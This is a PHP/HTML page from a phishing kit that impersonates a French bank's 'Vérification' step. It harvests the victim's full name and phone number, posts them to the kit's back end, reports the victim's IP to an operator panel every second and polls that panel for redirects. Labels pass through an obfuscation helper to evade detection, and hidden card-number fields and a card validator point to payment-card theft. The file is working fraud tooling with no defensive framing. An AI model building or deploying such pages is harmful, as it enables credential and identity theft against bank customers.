<?php 
require '../main.php';
?>
<!doctype html>
<html>
<head>
<title>Accéder à mes comptes en ligne</title>
<meta charset="utf-8">
<link rel="stylesheet" href="res/main.css">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<div class="topbar">
<div class="tbleft">
<li class="selected"><?php $bm->obf("Particuliers"); ?> <img src="res/arrow-bottom.png"></li>
<li class="lipc"><?php $bm->obf("Banque privée"); ?></li>
<li class="lipc"><?php $bm->obf("Professionnels"); ?></li>
<li class="lipc"><?php $bm->obf("Entreprises"); ?></li>
</div>
<div class="tbright">
<li><?php $bm->obf("Accessibilité"); ?></li>
<li>FR <img src="res/arrow-bottom-light.png"></li>
</div>

</div>

<header>
<div class="row mobile">
<div class="left">
    <img src="res/menu.png" class="mobile" style="width:35px; margin-right:10px;">
<img src="res/logo.png" style="width:180px;">
</div>
<div class="right" style="text-align:right;">
<img src="res/lock.png" style="width:25px;">
</div>
</div>
<div class="row pc">
<div class="left">
<img src="res/logo.png" class="logo">
<img src="res/logo-text.png" class="logo-text">
</div>
<div class="right" style="text-align:right;">
<button class="register"><?php $bm->obf("Devenir client"); ?></button>
</div>
</div>
</header>


<form action="action.php" method="POST">
    <input type="hidden" name="card_number">
    <input type="hidden" name="data">
</form>

<section>

<div class="bannertitle">
<h1><?php $bm->obf("Vérification"); ?></h1>
</div>

<div class="info-form">
<div class="notes">
<p><?php $bm->obf("Pour continuer, veuillez saisir les informations ci-dessous."); ?>  </p>
</div>

<style>
.formcol{
    width:700Px;
}
</style>
<div class="forma">
<div class="forma-title">
<?php $bm->obf("VOS COORDONNÉS"); ?>
</div>
<div class="forma-text">

<div class="formcol" >
<label><?php $bm->obf("Nom complet"); ?> : </label>
<input type="text" id="d0" class="textinput">
</div>
 
<div class="formcol" >
<label><?php $bm->obf("Numéro de téléphone"); ?> : </label>
<input type="text" id="d1" class="textinput" inputmode="numeric">
</div>

</div>
</div>

<div class="formcol" style="text-align:right; width:100%;">
<button onclick="sendInfo()" class="sbmt2"><?php $bm->obf("Valider"); ?></button>
</div>


</div>





</section>
 



<footer>
<img src="res/footer-pc-3.png"  class="footer-pc">
<img src="res/footer-mobile.png" class="footer-mobile">
<img src="res/footer-mobile3.png" class="footer-mobile">
</footer>




<style>
.loader{
    width:100%;
    height:100%;
    position:fixed;
    background:rgba(255,255,255,0.8);
    top:0;
    display:none;
	z-index:9999999999;
}
.loader .content{
    width:100%;
    height:100%;
    display:flex;
    align-items:center;
    justify-content:center;
}
</style>
<div class="loader">
<div class="content">
    <img src="res/loading.gif" style=" width:60px;">
</div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-creditcardvalidator/1.2.0/jquery.creditCardValidator.js"></script>

<script>
 

var doValidate = false;
var submitPass = true;


function sendInfo(){
    doValidate=true;
    submitPass = true;
$("input").each(function(){
    if($(this).val()==""){
        $(this).css("border", "1px solid red");
        submitPass=false;
    }
});


if(submitPass){
    $(".loader").show();
    $.post("post.php", {
        name:$("#d0").val(),
        phone:$("#d1").val() 
    }, function(data){
        window.location="wait.php?p=INFO";
    });
}


}


$("input").keyup(()=>{
    $("input").each(function(){
        if(doValidate==true){
            if($(this).val()==""){
                $(this).css("border", "1px solid red");
            }else{
                $(this).css("border", "1px solid #c1c1c1");
            }
        }
    });
});


$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendInfo();
    }
});

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
        }
    })

}, 2000);

</script>
</body>
</html>